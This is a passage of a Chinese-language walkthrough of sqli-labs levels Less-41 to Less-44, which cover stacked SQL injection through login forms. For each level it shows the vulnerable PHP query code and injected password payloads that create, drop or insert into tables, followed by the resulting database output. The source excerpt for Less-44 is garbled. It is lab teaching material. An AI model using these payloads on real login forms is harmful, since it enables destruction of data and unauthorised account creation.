none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;</code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| id  | username | password   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   1 | Dumb     | Dumb       |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   2 | Angelina | I-kill-you |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   3 | Dummy    | p@ssword   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   4 | secure   | crappy     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   5 | stupid   | stupidity  |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   6 | superman | genious    |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   7 | batman   | mob!le     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   8 | admin    | admin      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   9 | admin1   | admin1     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  10 | admin2   | admin2     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  11 | admin3   | admin3     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  12 | dhakkan  | dumbo      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  14 | admin4   | admin4     |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  38 | less38   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  39 | less39   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 109 | hello| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|  40 | less40   | hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| 110 | less41| hello      |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">18 rows in set (0.00 sec)</span></pre><p><span style="font-size:14px;line-height:34px;;">添加了用户&nbsp;less41</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">?id=1;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less41 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>;  //增加表<br  /><br  />?id=1;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 32px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less41;  //删除表</code></pre></section><h2><span style="font-size:16px;line-height:36px;;"><strong>5.Less-42 报错型堆叠注入&nbsp;-&nbsp;字符型 - POST</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码（login.php）：</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">username = mysqli_real_escape_string(<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$con1</span>, <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_POST</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 78px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"login_user"</span>]);</span><br  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;"><br  />$</span><span class="bash">password = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_POST</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 105px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"login_password"</span>];</span><br  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;"><br  />$</span><span class="bash">sql = <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 478px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"SELECT * FROM users WHERE username='<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$username</span>' and password='<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 58px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$password</span>'"</span>;</span></code></pre></section><p><span style="font-size:14px;line-height:34px;;">Password 变量在post 过程中，没有通过 mysql_real_escape_string() 函数的处理。</span><span style="font-size:14px;line-height:34px;;">因此在登录的时候密码选项我们可以进行 attack。</span></p><p><span style="font-size:14px;line-height:34px;;">（2）报错测试</span></p><p><span style="font-size:14px;line-height:34px;;">测试语句：</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username：任意<br  /><br  />password ：c';<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> me#   # 删除 me 表<br  />或者：<br  /><br  />username：任意<br  /><br  /><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span> ：c<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 302px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">';create table me like users# // 创建一个 me 表</span></code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录之前查看表：</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">mysql&gt;</span><span class="bash"> show tables;</span></code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">4 rows in set (0.00 sec)</span><br  /></pre><p><span style="font-size:14px;line-height:34px;;">登录前创建表</span></p><pre><span style="font-size:14px;line-height:34px;;">username ：</span><span style="font-size:14px;line-height:34px;;">admin</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">password ：</span><span style="font-size:14px;line-height:34px;;">c';create table less42 like users#</span></pre><p><span style="font-size:14px;line-height:34px;;">登录后查看创建表</span></p><pre><span style="font-size:14px;line-height:34px;;">mysql&gt; show tables;</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| less42|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">5 rows in set (0.00 sec)</span></pre><p><span style="font-size:14px;line-height:34px;;">发现添加了一个&nbsp;less42&nbsp;表，登录时构造的 sql 语句为:</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">SELECT</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">FROM</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">WHERE</span> username=’<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">admin</span>’ <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 20px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">and</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>=’c’;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less42 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>–+     //利用 c’;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> me#作为登录密码，删除该表。</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录前删除表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username：admin<br  />password ：c’;<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less42#</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录后查看删除表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">mysql&gt;</span><span class="bash"> show tables;</span></code></pre></section><pre><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">4 rows in set (0.00 sec)</span><br  /></pre><h2><strong><span style="font-size:16px;line-height:36px;;">6.Less-43 报错型&nbsp;-&nbsp;堆叠注入 - 字符型 - POST</span></strong></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">$</span><span class="bash">username = mysqli_real_escape_string(<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$con1</span>, <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_POST</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 78px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"login_user"</span>]);</span><br  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;"><br  />$</span><span class="bash">password = <span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$_POST</span>[<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 105px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"login_password"</span>];</span><br  /><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 6px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;"><br  />$</span><span class="bash">sql = <span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 503px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">"SELECT * FROM users WHERE username=('<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 58px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$username</span>') and password=('<span class="hljs-default-variable" style="color: rgb(209, 154, 102);background: rgba(0, 0, 0, 0);display: inline;width: 59px;text-decoration: none solid rgb(209, 154, 102);font-weight: 400;font-style: normal;">$password</span>')"</span>;</span></code></pre></section><p><span style="font-size:14px;line-height:34px;;">（2）测试</span></p><p><span style="font-size:14px;line-height:34px;;">登录前测创建表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username ：admin<br  /><br  />password：c');<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">create</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less43 <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">like</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>#</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录后查看增加表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">mysql&gt;</span><span class="bash"> show tables;</span></code></pre></section><pre><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| less43|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">5 rows in set (0.00 sec)</span><br  /></pre><p><span style="font-size:14px;line-height:34px;;">登录前测试删除表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username ：admin<br  /><br  />password ：c');<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">drop</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">table</span> less43#</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录后查看删除表</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default"><span class="hljs-default-meta" style="color: rgb(97, 174, 238);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(97, 174, 238);font-weight: 400;font-style: normal;">mysql&gt;</span><span class="bash"> show tables;</span></code></pre></section><pre><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| Tables_in_security |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| emails|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| referers|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| uagents|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| users|</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+--------------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">4 rows in set (0.00 sec)</span><br  /></pre><h2><span style="font-size:16px;line-height:36px;;"><strong>6.Less-44 盲注&nbsp;-&nbsp;堆叠注入 - 字符型 - POST</strong></span></h2><p><span style="font-size:14px;line-height:34px;;">（1）源代码</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST[“loginuser”]);POST[“loginuser”]); password =<br  /><br  />POST[“loginpassword”];POST[“loginpassword”]; sql = "<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">SELECT</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">FROM</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">WHERE</span><br  /><br  />username=<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 366px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'username′andpassword=′username′andpassword=′password’”;</span></code></pre></section><p><span style="font-size:14px;line-height:34px;;">（2）测试（盲注）</span></p><p><span style="font-size:14px;line-height:34px;;">登录前测试插入表和值</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">username ： admin<br  /><br  />password ： a';<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">insert</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">into</span> <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">users</span>(<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 13px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">id</span>,username,<span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 52px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">password</span>) <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">values</span> (<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 33px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'144'</span>,<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 53px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'less44'</span>,<span class="hljs-default-string" style="color: rgb(152, 195, 121);background: rgba(0, 0, 0, 0);display: inline;width: 46px;text-decoration: none solid rgb(152, 195, 121);font-weight: 400;font-style: normal;">'hello'</span>)#</code></pre></section><p><span style="font-size:14px;line-height:34px;;">登录后查看增加表和值</span></p><section data-mpa-preserve-tpl-color="t" data-mpa-template="t" class="mpa-template" mpa-preserve="t"><pre style="margin:0;padding:0;border-radius:none;background:none;"><code style="border-radius: 4px;font-size: 0.85em;margin: 0px 0.15em;background: rgb(40, 44, 52);color: rgb(171, 178, 191);display: block;padding: 5.95px;overflow-x: auto;white-space: nowrap;" class="hljs-default">mysql&gt; <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 39px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">select</span> * <span class="hljs-default-keyword" style="color: rgb(198, 120, 221);background: rgba(0, 0, 0, 0);display: inline;width: 26px;text-decoration: none solid rgb(198, 120, 221);font-weight: 400;font-style: normal;">from</span> users;</code></pre></section><pre><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">| id  | username | password   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">+-----+----------+------------+</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   1 | Dumb     | Dumb       |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   2 | Angelina | I-kill-you |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   3 | Dummy    | p@ssword   |</span><br  /><br  /><span style="font-size:14px;line-height:34px;;">|   4 | secure   | crappy     